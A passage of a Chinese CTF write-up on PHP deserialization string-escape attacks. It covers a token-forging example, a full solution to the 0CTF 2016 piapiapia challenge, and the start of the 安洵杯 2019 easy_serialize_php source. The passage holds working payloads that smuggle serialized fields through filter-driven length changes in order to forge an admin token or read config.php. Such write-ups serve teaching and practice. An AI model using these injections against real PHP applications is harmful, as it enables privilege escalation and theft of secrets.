message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li>更改 $to 的值</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:28:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><blockquote><ol start="4"><li>利用 <code>str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg))</code> 补充字符串长度；增加 27 个长度；</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span> = <span class="string">&#x27;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样被替换之后变成以下内容，正好补上 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=a&amp;m=b&amp;t=cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>然后我们抓包，更改 cookie 即可</p><p><img src="https://i.loli.net/2021/06/12/yedxVQwtYGucfm3.png" alt="image-20210612211255566"></p><h2 id="2-4-字符增多-—-0CTF-2016-piapiapia"><a href="#2-4-字符增多-—-0CTF-2016-piapiapia" class="headerlink" title="2.4 字符增多 — [0CTF 2016]piapiapia"></a>2.4 字符增多 — [0CTF 2016]piapiapia</h2><p><a href="https://buuoj.cn/challenges#[0CTF%202016]piapiapia">题目链接</a></p><p><strong>分析：</strong></p><blockquote><ol><li>目录扫描 ，得到 <a href="http://www.zip,查看源码/">www.zip，查看源码</a></li></ol></blockquote><p><img src="https://i.loli.net/2021/06/12/duJgi58ZpxNOwQk.png" alt="image-20210612213229646"></p><blockquote><ol start="2"><li>register.php ，注册一下</li><li>注册成功之后，将跳转 index.php，进行登录</li><li>成功登录，跳转到 update.php，填写详细信息，可进行文件上传</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$user-&gt;update_profile($username, serialize($profile));</code> 将填入的信息进行 序列化</p><blockquote><ol start="5"><li>它的上传文件的存储路径是 <code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code> ，起不到 <code>.php</code> 或者是 <code>图片木马包含的作用</code>;</li><li>代码审计</li></ol></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># register.php</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;is_exists(<span class="variable">$username</span>)) &#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;register(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>注册成功，进入 index.php 进行下一步的登录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>登陆成功之后，进入 profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$profile = unserialize($profile);</code> 将填写的信息进行反序列化输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到 flag 存在于 config.php 文件当中，我们想办法读取到 config.php</p><blockquote><p><strong>思路：</strong>在 profile.php 中存在 <code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> ；而 <code>$profile</code> 是一个数组，里面是我们输入的信息。如果我们控制 <code>$profile[&#39;photo&#39;]</code> 为 <code>config.php</code> 那么 之后的 <code>&lt;?php echo $phone;?&gt;</code> 将会显示出 base64 编码后的 config.php 文件内容，我们就会获取到 flag。</p></blockquote><p><strong>测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET传参：?p=<span class="number">123</span>&amp;e=<span class="number">123</span>@qq.com&amp;n=aaa&amp;o=config.php</span><br><span class="line">输出：a:<span class="number">4</span>:a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>更改 nickname 的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET传参：?p=<span class="number">123</span>&amp;e=<span class="number">123</span>@qq.com&amp;n=<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&amp;o=config.php</span></span><br><span class="line"><span class="string">输出：a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:3:&quot;</span><span class="number">123</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:10:&quot;</span><span class="number">123</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:34:&quot;</span><span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>字符增加替换 ，考虑到 update.php 以及 class.php 中的过滤，我们传入 数组 nickname[]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><p><img src="https://i.loli.net/2021/06/13/Wd1MD8Af4JGy2pe.png" alt="image-20210613183651536"></p><p><img src="https://i.loli.net/2021/06/13/Na6dklr1qA8v2Yo.png" alt="image-20210613183539171"></p><p>解码得 flag</p><p><img src="https://i.loli.net/2021/06/13/zjiFCvMSHx7PDdO.png" alt="image-20210613183613090"></p><h2 id="2-5-字符减少-—-安洵杯-2019-easy-serialize-php"><a href="#2-5-字符减少-—-安洵杯-2019-easy-serialize-php" class="headerlink" title="2.5 字符减少 — [安洵杯 2019]easy_serialize_php"></a>2.5 字符减少 — [安洵杯 2019]easy_serialize_php</h2><p><a href="https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_serialize_php">题目链接</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span 